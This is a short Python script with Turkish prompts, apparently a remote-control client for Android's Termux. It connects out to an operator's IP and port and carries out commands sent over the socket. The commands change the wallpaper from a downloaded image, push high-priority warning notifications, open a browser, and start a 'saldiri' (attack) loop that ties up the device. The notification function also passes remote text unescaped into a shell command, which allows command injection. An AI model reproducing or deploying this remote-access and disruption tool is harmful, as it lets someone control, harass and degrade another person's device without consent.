import socket
import os
import urllib.request
import time

SERVER_IP = input("Modem IP gir: ")
PORT = int(input("Port gir: "))

s = socket.socket()
try:
    s.connect((SERVER_IP, PORT))
    s.send("[✓] Baglanti basarili.\n".encode())
except:
    print("[!] Baglanti hatasi.")
    exit()

def arkaplan_degistir(url):
    try:
        urllib.request.urlretrieve(url, "arkaplan.jpg")
        os.system("termux-wallpaper -f arkaplan.jpg")
        s.send("[✓] Arka plan degistirildi\n".encode())
    except:
        s.send("[!] Arka plan degistirilemedi\n".encode())

def uyari_gonder(mesaj):
    os.system(f'termux-notification --title "UYARI" --content "{mesaj}" --priority high')
    s.send("[✓] Uyari gonderildi\n".encode())

def google_ac():
    os.system("termux-open-url https://www.google.com")
    s.send("[✓] Google acildi\n".encode())

def saldiri():
    while True:
        os.system("ls > /dev/null")

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut.startswith("arkaplan "):
            _, url = komut.split(" ", 1)
            arkaplan_degistir(url)
        elif komut.startswith("uyari "):
            _, mesaj = komut.split(" ", 1)
            uyari_gonder(mesaj)
        elif komut == "google":
            google_ac()
        elif komut == "saldiri":
            saldiri()
        elif komut == "exit":
            s.close()
            break
        else:
            s.send("[!] Gecersiz komut\n".encode())
    except:
        break
